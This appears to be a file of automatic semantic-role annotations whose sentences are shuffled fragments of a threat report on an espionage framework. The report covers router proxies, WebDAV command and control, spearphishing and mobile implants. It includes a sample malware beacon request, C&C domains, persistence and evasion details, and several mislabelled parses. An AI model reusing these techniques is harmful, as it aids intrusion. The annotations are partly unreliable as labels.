"ARG1": {"text": "by a call to free the PE image allocation from memory"}}, "free": {"V": {"text": "free", "index": 45}, "ARG1": {"text": "the PE image allocation"}, "ARG2": {"text": "from memory"}}}, "\n\n</section>\n\n\n<footer>22</footer>\n\f\n<section>\n<heading>The Sheep and the Wolves</heading>\n\nVictims of this attack will connect using the Windows WebDAV redirector, and\nthe HTTP request user-agent string will reflect this": {"will": {"V": {"text": "will", "index": 4}}, "connect": {"ARG0": {"text": "Victims of this attack"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "connect", "index": 5}, "ARG1": {"text": "using the Windows WebDAV redirector"}}, "using": {"V": {"text": "using", "index": 6}, "ARG1": {"text": "the Windows WebDAV redirector"}}, "request": {"ARGM-PRD": {"text": "HTTP"}, "V": {"text": "request", "index": 15}, "ARG0": {"text": "user - agent string"}}, "will_2": {"ARG1": {"text": "the HTTP request"}, "ARG0": {"text": "user - agent string"}, "V": {"text": "will", "index": 20}}, "reflect": {"ARG2": {"text": "the HTTP request user - agent string"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "reflect", "index": 21}, "ARG1": {"text": "this"}}}, "\n\nWe identified four IP addresses that connected to the proxy malware:\n<list>\nCloud enumerator:\nApparently a rented server at AS34224 NETERRA-AS, Bulgaria\n</list>\nThis host belongs to a Bulgarian VPS service and would use the router proxy to\nconnect to webdav.cloudme.com": {"identified": {"ARG0": {"text": "We"}, "V": {"text": "identified", "index": 1}, "ARG1": {"text": "four IP addresses that connected to the proxy malware"}}, "connected": {"V": {"text": "connected", "index": 6}, "ARG2": {"text": "to the proxy malware"}}, "belongs": {"ARG0": {"text": "This host"}, "V": {"text": "belongs", "index": 14}, "ARG1": {"text": "to a Bulgarian VPS service"}}, "would": {"V": {"text": "would", "index": 21}}, "use": {"ARG0": {"text": "This host"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "use", "index": 22}, "ARG1": {"text": "the router proxy"}, "ARG2": {"text": "to connect to webdav.cloudme.com"}}, "connect": {"ARG0": {"text": "This host"}, "V": {"text": "connect", "index": 27}, "ARG1": {"text": "to webdav.cloudme.com"}}}, "\n</list>\nTraffic from this IP had a very specific purpose: It unlocked routers for proxying in\nconnection with the sending of phishing emails": {"had": {"ARG0": {"text": "Traffic from this IP"}, "V": {"text": "had", "index": 4}, "ARG1": {"text": "a very specific purpose"}}, "unlocked": {"ARG0": {"text": "It"}, "V": {"text": "unlocked", "index": 11}, "ARG1": {"text": "routers"}, "ARG2": {"text": "for proxying"}, "ARGM-ADV": {"text": "in connection with the sending of phishing emails"}}, "proxying": {"V": {"text": "proxying", "index": 14}, "ARGM-ADV": {"text": "in connection"}}, "phishing": {"V": {"text": "phishing", "index": 21}, "ARG1": {"text": "emails"}}}, "\n\nRegardless of whether the registry launches the DLL or when another malware\nexecutable starts the DLL directly, the DLL is launched using regsrv32.exe with\nthe /s (silent) option": {"launches": {"ARG0": {"text": "the registry"}, "V": {"text": "launches", "index": 5}, "ARG1": {"text": "the DLL"}}, "starts": {"ARGM-TMP": {"text": "when"}, "ARG0": {"text": "another malware executable"}, "V": {"text": "starts", "index": 13}, "ARG1": {"text": "the DLL"}, "ARGM-MNR": {"text": "directly"}}, "is": {"V": {"text": "is", "index": 20}}, "launched": {"ARGM-ADV": {"text": "Regardless of whether the registry launches the DLL or when another malware executable starts the DLL directly"}, "ARG1": {"text": "the DLL"}, "V": {"text": "launched", "index": 21}, "ARGM-MNR": {"text": "using regsrv32.exe with the /s ( silent ) option"}}, "using": {"ARG0": {"text": "the DLL"}, "V": {"text": "using", "index": 22}, "ARG1": {"text": "regsrv32.exe"}, "ARG2": {"text": "with the /s ( silent ) option"}}}, " The\nmalicious content is stored inside the document in encoded form, and the\nshellcode decodes and writes this to disk": {"is": {"V": {"text": "is", "index": 3}}, "stored": {"ARG1": {"text": "The malicious content"}, "V": {"text": "stored", "index": 4}, "ARGM-LOC": {"text": "inside the document in encoded form"}}, "encoded": {"V": {"text": "encoded", "index": 9}, "ARG1": {"text": "form"}}, "writes": {"V": {"text": "writes", "index": 17}, "ARG1": {"text": "this to disk"}}, "disk": {"ARG1": {"text": "this"}, "V": {"text": "disk", "index": 20}}}, " It is designed as a survey tool": {"is": {"V": {"text": "is", "index": 1}}, "designed": {"ARG1": {"text": "It"}, "V": {"text": "designed", "index": 2}, "ARG3": {"text": "as a survey tool"}}}, " \u2013 clearly randomized in\norder to avoid detection by name": {"randomized": {"ARG1": {"text": "\u2013"}, "ARGM-ADV": {"text": "clearly"}, "V": {"text": "randomized", "index": 2}, "ARGM-PRP": {"text": "in order to avoid detection by name"}}, "avoid": {"V": {"text": "avoid", "index": 6}, "ARG1": {"text": "detection"}, "ARGM-MNR": {"text": "by name"}}}, "\n</section>\n\n\n\n<footer>40</footer>\n\f\n<section>\n<heading>Mobile malware: Apple IOS</heading>\n\n\nUsing an IOS User-Agent triggered the download of a Debian installer package,\nWhatsAppUpdate.deb, also 1.2Mb in size": {"Using": {"V": {"text": "Using", "index": 0}, "ARG1": {"text": "an IOS User - Agent"}}, "triggered": {"ARG0": {"text": "Using an IOS User - Agent"}, "V": {"text": "triggered", "index": 6}, "ARG1": {"text": "the download of a Debian installer package , WhatsAppUpdate.deb , also 1.2Mb in size"}}}, " The same router\n              botnet is used as a spreading and management platform for attacks on mobile\n              devices as well": {"is": {"V": {"text": "is", "index": 4}}, "used": {"ARG1": {"text": "The same router botnet"}, "V": {"text": "used", "index": 5}, "ARG2": {"text": "as a spreading and management platform for attacks on mobile devices"}, "ARGM-DIS": {"text": "as well"}}}, " When executed it will rebuild the original dll\n(95Num3p3gm.dll, presumably), load it from memory and pass over execution": {"executed": {"ARGM-TMP": {"text": "When"}, "V": {"text": "executed", "index": 1}, "ARG1": {"text": "it"}}, "will": {"ARGM-TMP": {"text": "When executed"}, "ARG0": {"text": "it"}, "V": {"text": "will", "index": 3}, "ARG1": {"text": "rebuild"}}, "rebuild": {"ARGM-TMP": {"text": "When executed"}, "ARG0": {"text": "it"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "rebuild", "index": 4}, "ARG1": {"text": "the original dll"}}, "load": {"ARGM-TMP": {"text": "When executed it will rebuild the original dll"}, "ARG0": {"text": "95Num3p3gm.dll"}, "V": {"text": "load", "index": 14}, "ARG2": {"text": "it/ from memory"}}, "pass": {"ARGM-TMP": {"text": "When executed it will rebuild the original dll ("}, "ARG0": {"text": "95Num3p3gm.dll"}, "V": {"text": "pass", "index": 19}, "ARG1": {"text": "over/ execution"}}}, " This host does all scanning of webdav shares\nfor stolen user data, and also uploads new malware components": {"does": {"V": {"text": "does", "index": 2}}, "stolen": {"V": {"text": "stolen", "index": 9}, "ARG1": {"text": "user data"}}, "uploads": {"ARG0": {"text": "This host"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "uploads", "index": 15}, "ARG1": {"text": "new malware components"}}}, " They are lightweight and intended to pull specific\nsurvey information from their target": {"are": {"ARG1": {"text": "They"}, "V": {"text": "are", "index": 1}, "ARG2": {"text": "lightweight and intended to pull specific survey information from their target"}}, "intended": {"ARG2": {"text": "They"}, "V": {"text": "intended", "index": 4}, "ARG1": {"text": "to pull specific survey information from their target"}}, "pull": {"ARG0": {"text": "They"}, "V": {"text": "pull", "index": 6}, "ARG1": {"text": "specific survey information"}, "ARG2": {"text": "from their target"}}}, "\n\n921.bin retrieves several datapoints about the infected machine: Domain info; a\nlist of running processes with all loaded modules in each; the list of installed\nsoftware; and a complete hardware profile of the target machine": {"retrieves": {"ARG0": {"text": "921.bin"}, "V": {"text": "retrieves", "index": 1}, "ARG1": {"text": "several datapoints about the infected machine : Domain info ; a list of running processes with all loaded modules in each ; the list of installed software ; and a complete hardware profile of the target machine"}}, "installed": {"V": {"text": "installed", "index": 27}, "ARG1": {"text": "software"}}}, " Immediately\nafter, the newly opened port would be connected to by another IP and used to\nsend phishing emails with malicious attachments": {"opened": {"ARGM-TMP": {"text": "newly"}, "V": {"text": "opened", "index": 5}, "ARG1": {"text": "port"}}, "would": {"V": {"text": "would", "index": 7}}, "be": {"V": {"text": "be", "index": 8}}, "connected": {"ARGM-TMP": {"text": "Immediately after"}, "ARG1": {"text": "the newly opened port"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "connected", "index": 9}, "ARG2": {"text": "to by another IP"}}, "used": {"V": {"text": "used", "index": 15}}, "send": {"ARG0": {"text": "the newly opened port"}, "V": {"text": "send", "index": 17}, "ARG1": {"text": "phishing emails"}, "ARG2": {"text": "with malicious attachments"}}, "phishing": {"V": {"text": "phishing", "index": 18}, "ARG1": {"text": "emails"}}}, "\n\nThe malware is able to collect a lot of other information, not all of which is\nactually used:\n<list>\n   \u2022   Account data\n   \u2022   Location\n   \u2022   Contacts\n   \u2022   External and Internal Storage (files written)\n   \u2022   Audio (microphone)\n   \u2022   Outgoing calls\n   \u2022   Incoming calls\n   \u2022   Call log\n   \u2022   Calendar\n   \u2022   Browser bookmarks\n   \u2022   Incoming SMS\n</list>\nThrough the encrypted C&C protocol, the attackers can issue commands and\nbinary updates to the malware": {"is": {"ARG1": {"text": "The malware"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "able to collect a lot of other information , not all of which is actually used"}}, "collect": {"ARG0": {"text": "The malware"}, "V": {"text": "collect", "index": 5}, "ARG1": {"text": "a lot of other information , not all of which is actually used"}}, "is_2": {"V": {"text": "is", "index": 16}}, "used": {"R-ARG1": {"text": "other information"}, "ARG1": {"text": "not all of which"}, "ARGM-ADV": {"text": "actually"}, "V": {"text": "used", "index": 18}}, "encrypted": {"V": {"text": "encrypted", "index": 22}, "ARG1": {"text": "C&C protocol"}}, "can": {"ARGM-MNR": {"text": "Through the encrypted C&C protocol"}, "ARG0": {"text": "the attackers"}, "V": {"text": "can", "index": 28}, "ARG1": {"text": "issue commands"}}, "issue": {"ARGM-MNR": {"text": "Through the encrypted C&C protocol"}, "ARG0": {"text": "the attackers"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "issue", "index": 29}}}, "\nThe PE file gathers system information including OS version, computer name,\nuser name, user group membership, the process it is running in, locale ID\u2019s, as\nwell as system drive and volume information": {"including": {"ARG2": {"text": "The PE file gathers system information"}, "V": {"text": "including", "index": 6}, "ARG1": {"text": "OS version , computer name , user name , user group membership"}}, "is": {"V": {"text": "is", "index": 23}}, "running": {"ARG1": {"text": "it"}, "V": {"text": "running", "index": 24}, "ARGM-DIR": {"text": "in"}}}, " The file creation times turned out to\nbe hours after the files themselves were uploaded to the WebDAV share": {"turned": {"ARG1": {"text": "The file creation times"}, "V": {"text": "turned", "index": 4}, "C-ARG1": {"text": "to be hours"}, "ARGM-TMP": {"text": "after the files themselves were uploaded to the WebDAV share"}}, "be": {"ARG1": {"text": "The file creation times"}, "V": {"text": "be", "index": 7}, "ARG2": {"text": "hours after the files themselves were uploaded to the WebDAV share"}}, "were": {"ARGM-TMP": {"text": "after the files"}, "ARG1": {"text": "themselves"}, "V": {"text": "were", "index": 13}, "ARG2": {"text": "uploaded to the WebDAV share"}}, "uploaded": {"ARG1": {"text": "the files themselves"}, "V": {"text": "uploaded", "index": 14}, "ARG2": {"text": "to the WebDAV share"}}}, "\n\nIn the wild we observed this IP connect to our router on the malware\nmanagement port and specify a SOCKSS proxy port to be opened": {"observed": {"ARGM-LOC": {"text": "In the wild"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 4}, "ARG1": {"text": "this IP connect to our router on the malware management port and specify a SOCKSS proxy port to be opened"}}, "connect": {"ARG0": {"text": "this IP"}, "V": {"text": "connect", "index": 7}, "ARG1": {"text": "to our router on the malware management port"}}, "specify": {"ARGM-LOC": {"text": "In the"}, "V": {"text": "specify", "index": 17}, "ARG1": {"text": "a SOCKSS proxy port to be opened"}}, "be": {"V": {"text": "be", "index": 23}}, "opened": {"ARG1": {"text": "a SOCKSS proxy port"}, "V": {"text": "opened", "index": 24}}}, "\n\nWhen connecting to this server, sccm.exe issues the following request:\n\n<figure>\nPOST /check.jsp HTTP/1.1\nAccept: */*..Accept-Language:en-us\nContent-Type: application/octet-stream\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nHost: www.antivir.com\nContent-Length: 8\nConnection: Keep-Alive\nCache-Control: no-cache\n</figure>\n\nThis C&C domain is used by many other malwares related to sccm.exe; some of\nwhich share obvious connections to the Quarian malware family, a known APT\nintrusion tool": {"connecting": {"ARGM-TMP": {"text": "When"}, "V": {"text": "connecting", "index": 1}, "ARG2": {"text": "to this server"}, "ARG1": {"text": "sccm.exe"}}, "issues": {"ARGM-TMP": {"text": "When connecting to this server"}, "ARG0": {"text": "sccm.exe"}, "V": {"text": "issues", "index": 7}, "ARG1": {"text": "the following request : This C&C domain is used by many other malwares related to sccm.exe ; some of which share obvious connections to the Quarian malware family , a known APT intrusion tool"}}, "following": {"V": {"text": "following", "index": 9}, "ARG1": {"text": "request"}}, "is": {"V": {"text": "is", "index": 15}}, "used": {"ARG1": {"text": "This C&C domain"}, "V": {"text": "used", "index": 16}, "ARG0": {"text": "by many other malwares related to sccm.exe"}}, "related": {"ARG1": {"text": "many other malwares"}, "V": {"text": "related", "index": 21}, "ARG2": {"text": "to sccm.exe"}}, "share": {"R-ARG0": {"text": "some of which"}, "V": {"text": "share", "index": 28}, "ARG1": {"text": "obvious connections to the Quarian malware family , a known APT intrusion tool"}}, "known": {"V": {"text": "known", "index": 38}, "ARG1": {"text": "APT intrusion tool"}}}, " The polymorphing\nmechanism also generates, and inserts, unique functions all of which make calls\nto different floating-point operations \u2013 all done just to obfuscate the actual\ndecoding process": {"polymorphing": {"V": {"text": "polymorphing", "index": 1}, "ARG0": {"text": "mechanism"}}, "generates": {"ARG0": {"text": "The polymorphing mechanism"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "generates", "index": 4}, "ARG1": {"text": "all of which make calls to different floating - point operations \u2013 all done just to obfuscate the actual decoding process"}}, "make": {"ARG0": {"text": "unique functions"}, "R-ARG0": {"text": "all of which"}, "V": {"text": "make", "index": 14}, "ARG1": {"text": "calls to different floating - point operations \u2013 all"}}, "done": {"V": {"text": "done", "index": 24}}, "obfuscate": {"ARGM-ADV": {"text": "just"}, "V": {"text": "obfuscate", "index": 27}, "ARG1": {"text": "the actual decoding process"}}}, " The Word document is displayed to the user to avoid arousing any\nsuspicion while the script is executed in the background": {"is": {"V": {"text": "is", "index": 3}}, "displayed": {"ARG1": {"text": "The Word document"}, "V": {"text": "displayed", "index": 4}, "ARG2": {"text": "to the user"}, "ARGM-PRP": {"text": "to avoid arousing any suspicion while the script is executed in the background"}}, "avoid": {"ARG0": {"text": "The Word document"}, "V": {"text": "avoid", "index": 9}, "ARG1": {"text": "arousing any suspicion"}, "ARGM-TMP": {"text": "while the script is executed in the background"}}, "arousing": {"V": {"text": "arousing", "index": 10}, "ARG1": {"text": "any suspicion"}, "ARGM-TMP": {"text": "while the script is executed in the background"}}, "is_2": {"V": {"text": "is", "index": 16}}, "executed": {"ARG1": {"text": "the script"}, "V": {"text": "executed", "index": 17}, "ARGM-LOC": {"text": "in the background"}}}, "\n</section>\n\n\n\n<footer>32</footer>\n\f\n<cover>\n<heading>\nPART III:\n\nAttacks on mobile devices\n</heading>\n</cover>\n\n\n\n<footer>33</footer>\n\f\n<section>\nOne of the spearphishing mails we observed coming through the router network\nwas this one, sent to an address under the gov.py (Government of Paraguay)\ndomain": {"observed": {"ARG0": {"text": "we"}, "V": {"text": "observed", "index": 6}, "C-ARG1": {"text": "coming through the router network"}}, "coming": {"ARG1": {"text": "the spearphishing mails"}, "V": {"text": "coming", "index": 7}, "ARGM-DIR": {"text": "through the router network"}}, "was": {"ARG1": {"text": "One of the spearphishing mails we observed coming through the router network"}, "V": {"text": "was", "index": 12}, "ARG2": {"text": "this one , sent to an address under the gov.py ( Government of Paraguay ) domain"}}, "sent": {"ARG1": {"text": "this one"}, "V": {"text": "sent", "index": 16}, "ARG2": {"text": "to an address under the gov.py ( Government of Paraguay ) domain"}}}, " In that\nparticular case we had the actual phishing email, so we knew the apparent\nrecipient \u2013 the CEO of a large Russian bank": {"had": {"ARGM-LOC": {"text": "In that particular case"}, "ARG0": {"text": "we"}, "V": {"text": "had", "index": 5}, "ARG1": {"text": "the actual phishing email"}}, "phishing": {"V": {"text": "phishing", "index": 8}, "ARG1": {"text": "email"}}, "knew": {"ARG0": {"text": "we"}, "V": {"text": "knew", "index": 13}, "ARG1": {"text": "the apparent recipient \u2013 the CEO of a large Russian bank"}}}, "\n\nThe C&C server in this case is ict32.msname.org": {"is": {"ARG1": {"text": "The C&C server in this case"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "ict32.msname.org"}}}, "\nAfter being proxied though the router, each of these would authenticate with one\nof the dedicated mail proxies and send out phishing attacks": {"being": {"V": {"text": "being", "index": 1}}, "proxied": {"V": {"text": "proxied", "index": 2}, "ARGM-ADV": {"text": "though the router"}}, "would": {"ARGM-TMP": {"text": "After being proxied though the router"}, "ARGM-MOD": {"text": "would"}, "ARG1": {"text": "authenticate with"}}, "authenticate": {"ARGM-TMP": {"text": "After being proxied though the router"}, "ARG1": {"text": "each of these"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "authenticate", "index": 11}, "ARGM-ADV": {"text": "with"}, "ARG2": {"text": "one of the dedicated mail proxies"}}, "send": {"ARGM-TMP": {"text": "After being proxied though the router"}, "ARG0": {"text": "each of these"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "send", "index": 20}, "ARGM-DIR": {"text": "out"}, "ARG1": {"text": "phishing attacks"}}, "phishing": {"V": {"text": "phishing", "index": 22}, "ARG1": {"text": "attacks"}}}, "\n\n\n\n\n<footer>12</footer>\n\f\nThe files will be installed in several locations:\n<list>\n%WinDir%,            ex": {}, "\n\n<figure></figure>\n\n\n<caption>Above: The decoding loop</caption>\n\n\nUpon successful execution this code drops a Word document and a Visual Basic\nscript": {"drops": {"ARGM-TMP": {"text": "Upon successful execution"}, "ARG0": {"text": "this code"}, "V": {"text": "drops", "index": 5}, "ARG1": {"text": "a Word document and a Visual Basic script"}}}, " This allows the attackers to uniquely identify every\ntargeted attack and track how successful each phishing campaign is": {"allows": {"ARG0": {"text": "This"}, "V": {"text": "allows", "index": 1}, "ARG1": {"text": "the attackers to uniquely identify every targeted attack and track how successful each phishing campaign"}}, "identify": {"ARG0": {"text": "the attackers"}, "ARGM-MNR": {"text": "uniquely"}, "V": {"text": "identify", "index": 6}, "ARG1": {"text": "every targeted attack"}}, "targeted": {"V": {"text": "targeted", "index": 8}, "ARG1": {"text": "attack"}}, "track": {"ARG0": {"text": "the attackers"}, "V": {"text": "track", "index": 11}, "ARG1": {"text": "how successful each phishing campaign is"}}, "phishing": {"V": {"text": "phishing", "index": 15}, "ARG0": {"text": "campaign"}}, "is": {"ARG2": {"text": "how successful"}, "ARG1": {"text": "each phishing campaign"}, "V": {"text": "is", "index": 17}}}, " Not only is the initial DLL apparently\n              polymorphed using some backend tool \u2013 the compile time stamps in the PE\n              header are clearly forged, resources are removed so as not to give away any\n              location information, and import tables are shuffled around, rendering import\n              hashes (aka imphashes) useless": {"is": {"V": {"text": "is", "index": 2}}, "polymorphed": {"ARGM-ADV": {"text": "apparently"}, "V": {"text": "polymorphed", "index": 7}}, "using": {"V": {"text": "using", "index": 8}, "ARG1": {"text": "some backend tool \u2013 the compile time stamps in the PE header"}}, "are": {"V": {"text": "are", "index": 21}}, "forged": {"ARG1": {"text": "the compile time stamps in the PE header"}, "ARGM-ADV": {"text": "clearly"}, "V": {"text": "forged", "index": 23}}, "are_2": {"V": {"text": "are", "index": 26}}, "removed": {"ARG1": {"text": "resources"}, "V": {"text": "removed", "index": 27}, "ARGM-PRP": {"text": "so as not to give away any location information"}}, "give": {"ARG0": {"text": "resources"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "give", "index": 32}, "ARG1": {"text": "any location information"}}, "are_3": {"ARG1": {"text": "import tables"}, "V": {"text": "are", "index": 41}, "ARG2": {"text": "shuffled"}}, "shuffled": {"ARG0": {"text": "import tables"}, "V": {"text": "shuffled", "index": 42}, "ARG1": {"text": "around"}}, "rendering": {"ARG2": {"text": "import tables/ ) useless"}, "V": {"text": "rendering", "index": 45}, "ARG1": {"text": "import hashes ( aka imphashes"}}}, "\n\n\n\n\n<footer>31</footer>\n\f\nThe email shown above was one of a number of messages sent to targets in the\noil industry": {"shown": {"ARG0": {"text": "The email"}, "V": {"text": "shown", "index": 2}, "ARGM-LOC": {"text": "above"}, "ARG1": {"text": "was one of a number of messages sent to targets in the oil industry"}}, "was": {"ARG1": {"text": "The email shown above"}, "V": {"text": "was", "index": 4}, "ARG2": {"text": "one of a number of messages sent to targets in the oil industry"}}, "sent": {"ARG1": {"text": "messages"}, "V": {"text": "sent", "index": 11}, "ARG2": {"text": "to targets in the oil industry"}}}, " Once received the malware would attempt to connect to the\ndomain name on the specified port and would start tunneling all traffic received\nfrom the SOCKSS port to the destination and vise-versa": {"received": {"V": {"text": "received", "index": 1}, "ARG1": {"text": "the malware"}}, "would": {"ARGM-TMP": {"text": "Once"}, "ARG0": {"text": "the malware"}, "V": {"text": "would", "index": 4}, "ARG1": {"text": "attempt to connect to the domain name on the specified port"}}, "attempt": {"ARGM-TMP": {"text": "Once"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "attempt", "index": 5}, "ARG1": {"text": "to connect to the domain name on the specified port"}}, "connect": {"ARG0": {"text": "the malware"}, "V": {"text": "connect", "index": 7}, "ARG1": {"text": "to the domain name"}, "ARGM-LOC": {"text": "on the specified port"}}, "specified": {"V": {"text": "specified", "index": 14}, "ARG1": {"text": "port"}}, "would_2": {"V": {"text": "would", "index": 17}}, "start": {"ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "would"}, "V": {"text": "start", "index": 18}, "ARG1": {"text": "tunneling all traffic received from the SOCKSS port to the destination and vise -"}}, "tunneling": {"ARG0": {"text": "the malware"}, "V": {"text": "tunneling", "index": 19}, "ARG1": {"text": "all traffic received from the SOCKSS port to the destination and vise - versa"}}, "received_2": {"ARG1": {"text": "all traffic"}, "V": {"text": "received", "index": 22}, "ARG3": {"text": "from the SOCKSS port"}, "ARG2": {"text": "to the destination"}}}, " They are executed in memory\nonly, and once they have completed the memory is freed": {"are": {"V": {"text": "are", "index": 1}}, "executed": {"ARG0": {"text": "They"}, "V": {"text": "executed", "index": 2}, "ARGM-ADV": {"text": "in memory/ only"}}, "have": {"V": {"text": "have", "index": 10}}, "completed": {"ARG0": {"text": "they"}, "V": {"text": "completed", "index": 11}}, "is": {"ARGM-TMP": {"text": "once they have completed"}, "ARG1": {"text": "the memory"}, "V": {"text": "is", "index": 14}, "ARG2": {"text": "freed"}}, "freed": {"ARGM-TMP": {"text": "once they have completed"}, "ARG1": {"text": "the memory"}, "V": {"text": "freed", "index": 15}}}, " Instead, when\nthey are executed they are passed a pointer to a function to use for sending data\nback home": {"are": {"V": {"text": "are", "index": 4}}, "executed": {"ARGM-TMP": {"text": "when"}, "ARG1": {"text": "they"}, "V": {"text": "executed", "index": 5}}, "are_2": {"V": {"text": "are", "index": 7}}, "passed": {"ARGM-DIS": {"text": "Instead"}, "ARGM-TMP": {"text": "when they are executed"}, "V": {"text": "passed", "index": 8}, "ARG1": {"text": "a pointer"}, "ARG2": {"text": "to a function"}, "ARGM-PRP": {"text": "to use for sending data back home"}}, "use": {"V": {"text": "use", "index": 15}, "ARG2": {"text": "for sending data back home"}}, "sending": {"V": {"text": "sending", "index": 17}, "ARG1": {"text": "data"}, "ARG4": {"text": "back home"}}}, " They turned out\nto belong to a highly advanced and professional targeted attack framework,\nwhich utilized a complex series of techniques to survey potential targets": {"turned": {"V": {"text": "turned", "index": 1}, "ARG1": {"text": "to belong to a highly advanced and professional targeted attack framework , which utilized a complex series of techniques to survey potential targets"}}, "belong": {"ARG0": {"text": "They"}, "V": {"text": "belong", "index": 4}, "ARG1": {"text": "to a highly advanced and professional targeted attack framework , which utilized a complex series of techniques to survey potential targets"}}, "targeted": {"V": {"text": "targeted", "index": 11}, "ARG1": {"text": "attack framework"}}, "utilized": {"ARG0": {"text": "a highly advanced and professional targeted attack framework"}, "R-ARG0": {"text": "which"}, "V": {"text": "utilized", "index": 16}, "ARG1": {"text": "a complex series of techniques to survey potential targets"}}, "survey": {"V": {"text": "survey", "index": 23}, "ARG1": {"text": "potential targets"}}}, " The mail proxy would then relay the spearphishing mail as\nseen below": {"would": {"V": {"text": "would", "index": 3}}, "relay": {"ARG0": {"text": "The mail proxy"}, "ARGM-MOD": {"text": "would"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "relay", "index": 5}, "ARG1": {"text": "the spearphishing mail"}, "ARGM-ADV": {"text": "as seen below"}}, "seen": {"V": {"text": "seen", "index": 10}, "ARGM-LOC": {"text": "below"}}}, " This collects:\n<list>\n   \u2022   deviceName, manufacturerName\n   \u2022   platformVersion, softwareVersion\n   \u2022   brandVendorId, brandVersion\n   \u2022   total and free flash size of the device\n   \u2022   amount of memory/storage already allocated\n   \u2022   ownerName, ownerInformation\n   \u2022   Phone mumber\n   \u2022   PIN\n   \u2022   IMSI\n   \u2022   IMEI\n   \u2022   mcc and mnc (Mobile Carrier ID)\n   \u2022   cellID\n   \u2022   Location area code\n   \u2022   isPasswordEnabled\n   \u2022   Battery data (level, temperature, voltage, etc)\n   \u2022   Installed applications\n   \u2022   Address book\n   \u2022   APChannel\n   \u2022   Connected Network Type\n   \u2022   BSSID\n   \u2022   DataRate\n   \u2022   Profile Name\n   \u2022   RadioBand\n   \u2022   SecurityCategory\n   \u2022   SignalLevel\n   \u2022   SSID\n</list>\nCollected data will be uploaded to a DynDNS domain currently hosted on a US\nwebhosting service": {"collects": {"V": {"text": "collects", "index": 1}}, "Collected": {"V": {"text": "Collected", "index": 3}, "ARG1": {"text": "data"}}, "will": {"V": {"text": "will", "index": 5}}, "be": {"ARG1": {"text": "Collected data"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "be", "index": 6}, "ARG2": {"text": "uploaded to a DynDNS domain currently hosted on a US webhosting service"}}, "uploaded": {"ARG1": {"text": "Collected data"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "uploaded", "index": 7}, "ARG2": {"text": "to a DynDNS domain currently hosted on a US webhosting service"}}, "hosted": {"ARG1": {"text": "a DynDNS domain"}, "ARGM-TMP": {"text": "currently"}, "V": {"text": "hosted", "index": 13}, "ARGM-LOC": {"text": "on a US webhosting service"}}}, " If such a file is present on the server, the\nmalware downloads the new configuration file then deletes it from the server": {"is": {"ARG1": {"text": "such a file"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "present on the server"}}, "downloads": {"ARGM-ADV": {"text": "If such a file is present on the server"}, "ARG0": {"text": "the malware"}, "V": {"text": "downloads", "index": 12}, "ARG1": {"text": "the new configuration file"}}, "deletes": {"ARGM-ADV": {"text": "If such a file is present on the server"}, "ARG0": {"text": "the malware"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "deletes", "index": 18}, "ARG1": {"text": "it"}, "ARG2": {"text": "from the server"}}}, "\n\nThese files were downloaded as encrypted *.bin files from the accounts\ncarter0648 and frogs6352": {"were": {"V": {"text": "were", "index": 2}}, "downloaded": {"ARG1": {"text": "These files"}, "V": {"text": "downloaded", "index": 3}, "ARGM-ADV": {"text": "as encrypted"}}, "encrypted": {"V": {"text": "encrypted", "index": 5}, "ARG1": {"text": "* .bin files"}, "ARG2": {"text": "from the accounts carter0648"}}}, "\nAdditionally, once the resource is established, the malware can transfer files to\nand from the command and control servers using standard file IO commands": {"is": {"V": {"text": "is", "index": 5}}, "established": {"ARG1": {"text": "the resource"}, "V": {"text": "established", "index": 6}}, "can": {"ARGM-DIS": {"text": "Additionally"}, "ARGM-TMP": {"text": "once the resource is established"}, "ARG0": {"text": "the malware"}, "V": {"text": "can", "index": 10}, "ARG1": {"text": "transfer files to and from the command and control servers using standard file IO commands"}}, "transfer": {"ARGM-DIS": {"text": "Additionally"}, "ARGM-TMP": {"text": "once the resource is established"}, "ARG0": {"text": "the malware"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "transfer", "index": 11}, "ARG1": {"text": "files"}, "ARG2": {"text": "to"}, "ARGM-MNR": {"text": "using standard file IO commands"}}, "using": {"V": {"text": "using", "index": 21}, "ARG1": {"text": "standard file IO commands"}}}, "\n\nThe VBScript then sets a startup key in the\n\u201cHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u201d registry path to\nexecute the DLLs at boot time": {"sets": {"ARG0": {"text": "The VBScript"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "sets", "index": 3}, "ARG1": {"text": "a startup key in the \u201c HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \u201d registry path to execute the DLLs at boot time"}}, "execute": {"V": {"text": "execute", "index": 15}, "ARG1": {"text": "the DLLs"}, "ARGM-TMP": {"text": "at boot time"}}}, " It\nseems that because the plugins exist in memory only, they are injected daily to\nensure persistence on victim computers": {"seems": {"V": {"text": "seems", "index": 1}, "ARG1": {"text": "that because the plugins exist in memory only , they are injected daily to ensure persistence on victim computers"}}, "exist": {"ARG1": {"text": "the plugins"}, "V": {"text": "exist", "index": 6}, "ARGM-MNR": {"text": "in memory"}, "ARGM-ADV": {"text": "only"}}, "are": {"V": {"text": "are", "index": 12}}, "injected": {"ARGM-CAU": {"text": "because the plugins exist in memory only"}, "ARG0": {"text": "they"}, "V": {"text": "injected", "index": 13}, "ARGM-TMP": {"text": "daily"}, "ARG2": {"text": "to ensure persistence on victim computers"}}, "ensure": {"ARG0": {"text": "they"}, "V": {"text": "ensure", "index": 16}, "ARG1": {"text": 